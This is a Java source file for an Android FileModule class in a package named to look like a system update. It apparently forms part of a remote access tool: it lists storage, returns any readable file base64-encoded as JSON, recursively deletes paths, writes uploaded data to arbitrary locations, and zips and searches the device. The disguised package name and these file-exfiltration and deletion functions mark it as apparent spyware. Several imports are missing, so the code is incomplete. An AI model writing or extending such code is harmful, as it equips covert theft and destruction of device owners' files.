package com.android.system.update.modules;

import android.content.Context;
import android.os.Environment;
import android.util.Base64;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import org.json.JSONArray;
import org.json.JSONObject;
import org.json.JSONException;

public class FileModule {
    private Context context;
    private static final int MAX_FILE_SIZE = 50 * 1024 * 1024; // 50MB limit for transfers
    
    public FileModule(Context context) {
        this.context = context;
    }
    
    public String listFiles(String path) {
        try {
            File dir;
            if (path == null || path.isEmpty() || path.equals("/")) {
                dir = Environment.getExternalStorageDirectory();
            } else {
                dir = new File(path);
            }
            
            if (!dir.exists()) {
                JSONObject error = new JSONObject();
                error.put("error", "Directory does not exist");
                error.put("path", path);
                error.put("success", false);
                return error.toString();
            }
            
            if (!dir.canRead()) {
                JSONObject error = new JSONObject();
                error.put("error", "Cannot read directory - permission denied");
                error.put("path", path);
                error.put("success", false);
                return error.toString();
            }
            
            JSONObject result = new JSONObject();
            result.put("current_path", dir.getAbsolutePath());
            result.put("parent_path", dir.getParent() != null ? dir.getParent() : "");
            result.put("success", true);
            
            JSONArray filesList = new JSONArray();
            File[] files = dir.listFiles();
            
            if (files != null) {
                for (File file : files) {
                    JSONObject fileObj = new JSONObject();
                    fileObj.put("name", file.getName());
                    fileObj.put("path", file.getAbsolutePath());
                    fileObj.put("isDirectory", file.isDirectory());
                    fileObj.put("size", file.length());
                    fileObj.put("lastModified", file.lastModified());
                    fileObj.put("canRead", file.canRead());
                    fileObj.put("canWrite", file.canWrite());
                    fileObj.put("isHidden", file.isHidden());
                    
                    if (!file.isDirectory()) {
                        String extension = getFileExtension(file.getName());
                        fileObj.put("extension", extension);
                        fileObj.put("mimeType", getMimeType(file.getName()));
                    }
                    
                    filesList.put(fileObj);
                }
            }
            
            result.put("files", filesList);
            result.put("total", filesList.length());
            
            return result.toString();
            
        } catch (JSONException e) {
            e.printStackTrace();
            return createErrorResponse("JSON error: " + e.getMessage());
        } catch (Exception e) {
            e.printStackTrace();
            return createErrorResponse(e.getMessage());
        }
    }
    
    public String getFile(String path) {
        try {
            File file = new File(path);
            if (!file.exists()) {
                return createErrorResponse("File not found");
            }
            
            if (!file.canRead()) {
                return createErrorResponse("Cannot read file - permission denied");
            }
            
            if (file.length() > MAX_FILE_SIZE) {
                return createErrorResponse("File too large (max " + (MAX_FILE_SIZE/1024/1024) + "MB)");
            }
            
            FileInputStream fis = new FileInputStream(file);
            byte[] bytes = new byte[(int) file.length()];
            fis.read(bytes);
            fis.close();
            
            JSONObject response = new JSONObject();
            response.put("success", true);
            response.put("name", file.getName());
            response.put("size", file.length());
            response.put("data", Base64.encodeToString(bytes, Base64.DEFAULT));
            response.put("mimeType", getMimeType(file.getName()));
            
            return response.toString();
            
        } catch (JSONException e) {
            e.printStackTrace();
            return createErrorResponse("JSON error: " + e.getMessage());
        } catch (Exception e) {
            e.printStackTrace();
            return createErrorResponse(e.getMessage());
        }
    }
    
    public String deleteFile(String path) {
        try {
            File file = new File(path);
            if (!file.exists()) {
                return createErrorResponse("File not found");
            }
            
            boolean deleted;
            if (file.isDirectory()) {
                deleted = deleteDirectory(file);
            } else {
                deleted = file.delete();
            }
            
            if (deleted) {
                JSONObject response = new JSONObject();
                response.put("success", true);
                response.put("message", "Deleted successfully");
                response.put("path", path);
                return response.toString();
            } else {
                return createErrorResponse("Failed to delete");
            }
            
        } catch (JSONException e) {
            e.printStackTrace();
            return createErrorResponse("JSON error: " + e.getMessage());
        } catch (Exception e) {
            e.printStackTrace();
            return createErrorResponse(e.getMessage());
        }
    }
    
    private boolean deleteDirectory(File directory) {
        if (directory.exists()) {
            File[] files = directory.listFiles();
            if (files != null) {
                for (File file : files) {
                    if (file.isDirectory()) {
                        deleteDirectory(file);
                    } else {
                        file.delete();
                    }
                }
            }
        }
        return directory.delete();
    }
    
    public String createFolder(String path, String folderName) {
        try {
            File folder = new File(path, folderName);
            if (folder.exists()) {
                return createErrorResponse("Folder already exists");
            }
            
            boolean created = folder.mkdirs();
            if (created) {
                JSONObject response = new JSONObject();
                response.put("success", true);
                response.put("message", "Folder created");
                response.put("path", folder.getAbsolutePath());
                return response.toString();
            } else {
                return createErrorResponse("Failed to create folder");
            }
            
        } catch (JSONException e) {
            e.printStackTrace();
            return createErrorResponse("JSON error: " + e.getMessage());
        } catch (Exception e) {
            e.printStackTrace();
            return createErrorResponse(e.getMessage());
        }
    }
    
    public String renameFile(String oldPath, String newName) {
        try {
            File oldFile = new File(oldPath);
            File parent = oldFile.getParentFile();
            File newFile = new File(parent, newName);
            
            if (newFile.exists()) {
                return createErrorResponse("A file with that name already exists");
            }
            
            boolean renamed = oldFile.renameTo(newFile);
            if (renamed) {
                JSONObject response = new JSONObject();
                response.put("success", true);
                response.put("message", "Renamed successfully");
                response.put("newPath", newFile.getAbsolutePath());
                return response.toString();
            } else {
                return createErrorResponse("Failed to rename");
            }
            
        } catch (JSONException e) {
            e.printStackTrace();
            return createErrorResponse("JSON error: " + e.getMessage());
        } catch (Exception e) {
            e.printStackTrace();
            return createErrorResponse(e.getMessage());
        }
    }
    
    public String uploadFile(String path, String fileName, String base64Data) {
        try {
            File dir = new File(path);
            if (!dir.exists()) {
                dir.mkdirs();
            }
            
            File file = new File(dir, fileName);
            byte[] bytes = Base64.decode(base64Data, Base64.DEFAULT);
            
            FileOutputStream fos = new FileOutputStream(file);
            fos.write(bytes);
            fos.close();
            
            JSONObject response = new JSONObject();
            response.put("success", true);
            response.put("message", "File uploaded");
            response.put("path", file.getAbsolutePath());
            response.put("size", bytes.length);
            
            return response.toString();
            
        } catch (JSONException e) {
            e.printStackTrace();
            return createErrorResponse("JSON error: " + e.getMessage());
        } catch (Exception e) {
            e.printStackTrace();
            return createErrorResponse(e.getMessage());
        }
    }
    
    public String zipFile(String path) {
        try {
            File source = new File(path);
            File zipFile = new File(source.getParent(), source.getName() + ".zip");
            
            if (zipFile.exists()) {
                zipFile.delete();
            }
            
            FileOutputStream fos = new FileOutputStream(zipFile);
            ZipOutputStream zos = new ZipOutputStream(fos);
            
            if (source.isDirectory()) {
                zipDirectory(source, source.getName(), zos);
            } else {
                zipFile(source, source.getName(), zos);
            }
            
            zos.close();
            fos.close();
            
            JSONObject response = new JSONObject();
            response.put("success", true);
            response.put("message", "Zipped successfully");
            response.put("path", zipFile.getAbsolutePath());
            response.put("size", zipFile.length());
            
            return response.toString();
            
        } catch (JSONException e) {
            e.printStackTrace();
            return createErrorResponse("JSON error: " + e.getMessage());
        } catch (Exception e) {
            e.printStackTrace();
            return createErrorResponse(e.getMessage());
        }
    }
    
    private void zipDirectory(File folder, String parentFolder, ZipOutputStream zos) throws Exception {
        File[] files = folder.listFiles();
        if (files != null) {
            for (File file : files) {
                if (file.isDirectory()) {
                    zipDirectory(file, parentFolder + "/" + file.getName(), zos);
                } else {
                    zipFile(file, parentFolder + "/" + file.getName(), zos);
                }
            }
        }
    }
    
    private void zipFile(File file, String entryName, ZipOutputStream zos) throws Exception {
        byte[] buffer = new byte[1024];
        FileInputStream fis = new FileInputStream(file);
        zos.putNextEntry(new ZipEntry(entryName));
        
        int length;
        while ((length = fis.read(buffer)) > 0) {
            zos.write(buffer, 0, length);
        }
        
        zos.closeEntry();
        fis.close();
    }
    
    public String searchFiles(String path, String query) {
        try {
            File dir = new File(path);
            if (!dir.exists() || !dir.isDirectory()) {
                return createErrorResponse("Invalid directory");
            }
            
            JSONArray results = new JSONArray();
            searchInDirectory(dir, query.toLowerCase(), results);
            
            JSONObject response = new JSONObject();
            response.put("success", true);
            response.put("results", results);
            response.put("count", results.length());
            
            return response.toString();
            
        } catch (JSONException e) {
            e.printStackTrace();
            return createErrorResponse("JSON error: " + e.getMessage());
        } catch (Exception e) {
            e.printStackTrace();
            return createErrorResponse(e.getMessage());
        }
    }
    
    private void searchInDirectory(File dir, String query, JSONArray results) throws Exception {
        File[] files = dir.listFiles();
        if (files == null) return;
        
        for (File file : files) {
            if (file.getName().toLowerCase().contains(query)) {
                JSONObject fileObj = new JSONObject();
                fileObj.put("name", file.getName());
                fileObj.put("path", file.getAbsolutePath());
                fileObj.put("isDirectory", file.isDirectory());
                fileObj.put("size", file.length());
                fileObj.put("lastModified", file.lastModified());
                results.put(fileObj);
            }
            
            if (file.isDirectory()) {
                searchInDirectory(file, query, results);
            }
        }
    }
    
    public String getStorageInfo() {
        try {
            JSONObject info = new JSONObject();
            
            // Internal storage
            File internal = Environment.getExternalStorageDirectory();
            if (internal != null) {
                JSONObject internalInfo = new JSONObject();
                internalInfo.put("path", internal.getAbsolutePath());
                internalInfo.put("total", internal.getTotalSpace());
                internalInfo.put("free", internal.getFreeSpace());
                internalInfo.put("used", internal.getTotalSpace() - internal.getFreeSpace());
                info.put("internal", internalInfo);
            }
            
            // Check for external SD card
            File[] externalFiles = context.getExternalFilesDirs(null);
            if (externalFiles.length > 1 && externalFiles[1] != null) {
                JSONObject externalInfo = new JSONObject();
                externalInfo.put("path", externalFiles[1].getAbsolutePath());
                externalInfo.put("available", true);
                info.put("external", externalInfo);
            }
            
            info.put("success", true);
            return info.toString();
            
        } catch (JSONException e) {
            e.printStackTrace();
            return createErrorResponse("JSON error: " + e.getMessage());
        } catch (Exception e) {
            e.printStackTrace();
            return createErrorResponse(e.getMessage());
        }
    }
    
    private String getFileExtension(String fileName) {
        int lastDot = fileName.lastIndexOf('.');
        if (lastDot > 0 && lastDot < fileName.length() - 1) {
            return fileName.substring(lastDot + 1).toLowerCase();
        }
        return "";
    }
    
    private String getMimeType(String fileName) {
        String extension = getFileExtension(fileName);
        if (extension.isEmpty()) return "application/octet-stream";
        
        MimeTypeMap mime = MimeTypeMap.getSingleton();
        String type = mime.getMimeTypeFromExtension(extension);
        return type != null ? type : "application/octet-stream";
    }
    
    private String createErrorResponse(String message) {
        try {
            JSONObject error = new JSONObject();
            error.put("success", false);
            error.put("error", message);
            return error.toString();
        } catch (JSONException e) {
            return "{\"success\":false,\"error\":\"" + message + "\"}";
        }
    }
}
